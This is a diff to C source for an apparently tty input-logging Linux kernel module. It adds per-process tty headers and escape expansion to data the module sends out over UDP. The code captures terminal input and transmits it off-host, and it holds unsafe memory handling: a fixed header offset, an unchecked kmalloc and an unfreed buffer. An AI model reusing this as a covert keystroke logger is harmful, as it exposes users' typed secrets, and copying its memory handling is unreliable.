@@ -8,15 +8,54 @@
 #include "common.h"
 #include "inputlog.h"
 
+#define BUFLEN 128
 #define UDP_MAX_DATA_LEN 65507
 
 struct socket *sock = NULL;
 struct sockaddr_in addr, bind;
 
-void
-send_udp(char *buf, int buflen)
+static void
+build_header(char *buf, pid_t pid, struct file *file)
 {
-    int sent, packlen;
+    sprintf(buf, "[%-8d tty%-3s] ", pid, file->f_path.dentry->d_name.name);
+}
+
+static int
+expand_escape_chars(char *buf, const char *src, int srclen)
+{
+    size_t i;
+    int buflen;
+    char c;
+
+#define EXPAND_ESCAPE(x) \
+    do{ *(buf++) = '\\'; *(buf++) = (x); buflen += 2; } while(0)
+
+    for (buflen = 0, i = 0; i < srclen; ++i) {
+        switch ((c = src[i])) {
+        case '\a': EXPAND_ESCAPE('a');  break;
+        case '\b': EXPAND_ESCAPE('b');  break;
+        case '\e': EXPAND_ESCAPE('e');  break;
+        case '\f': EXPAND_ESCAPE('f');  break;
+        case '\n': EXPAND_ESCAPE('n');  break;
+        case '\r': EXPAND_ESCAPE('r');  break;
+        case '\t': EXPAND_ESCAPE('t');  break;
+        case '\v': EXPAND_ESCAPE('v');  break;
+        case '\"': EXPAND_ESCAPE('\"'); break;
+        case '\'': EXPAND_ESCAPE('\''); break;
+        case '\?': EXPAND_ESCAPE('?');  break;
+        default: *(buf++) = c; ++buflen; break;
+        }
+    }
+
+    *buf = '\0';
+    return buflen;
+}
+
+void
+send_udp(pid_t pid, struct file *file, char *buf, int buflen)
+{
+    int sent, packlen, session_buflen;
+    char *session_buf, *session_bdy;
     struct msghdr msg;
     struct kvec iov;
     mm_segment_t fs;
@@ -30,6 +69,14 @@ send_udp(char *buf, int buflen)
     msg.msg_flags = 0;
     msg.msg_name = &addr;
     msg.msg_namelen = sizeof(addr);
+
+    session_buf = (char *)kmalloc(19 + buflen * 2, GFP_KERNEL);
+    build_header(session_buf, pid, file);
+
+    session_bdy = session_buf + 18;
+    session_buflen = expand_escape_chars(session_bdy, buf, buflen);
+
+    DEBUG_INFO("testing: %s\n", session_buf);
 
     while (buflen > 0) {
         packlen = (buflen < UDP_MAX_DATA_LEN)
